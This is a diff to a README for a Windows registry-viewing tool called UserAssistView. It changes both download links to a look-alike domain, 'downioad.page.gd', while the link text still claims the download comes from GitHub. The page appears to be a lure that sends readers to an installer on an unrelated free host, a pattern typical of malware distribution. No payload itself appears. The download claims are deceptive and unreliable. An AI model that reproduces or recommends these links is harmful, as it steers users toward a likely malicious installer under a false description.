@@ -2,7 +2,7 @@
 
 UserAssistView is a powerful tool designed for Windows users to explore and analyze UserAssist entries from the registry. This utility provides detailed insights into application launch history, helping users understand their usage patterns. With its intuitive interface, UserAssistView makes it easy to view and export data for further analysis.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -57,7 +57,7 @@ For more details or to report issues, please visit the download page. UserAssist
 
 To get the latest version of UserAssistView, click on the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
